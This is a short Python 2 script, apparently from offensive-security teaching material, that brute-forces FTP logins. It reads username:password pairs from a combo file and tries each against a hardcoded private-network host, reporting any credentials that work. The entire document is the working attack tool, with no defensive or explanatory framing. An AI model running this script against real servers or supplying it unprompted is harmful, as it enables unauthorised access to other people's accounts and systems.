#!/usr/bin/python
import ftplib
def bruteLogin(hostname, passwdFile):
	pF = open(passwdFile, 'r')
	for line in pF.readlines():
		userName = line.split(':')[0]
		passWord = line.split(':')[1]
		print "[+] Trying: " + userName + "/" + passWord
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName,passWord)
			print '[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + userName + '/' + passWord
			ftp.quit()
			return(userName, passWord)
		except Exception as e:
			pass
	print '[-] Could not brute force FTP credentials'
	return(None, None)
host = '192.168.1.130'
passwdFile = 'comb.txt'
bruteLogin(host, passwdFile)

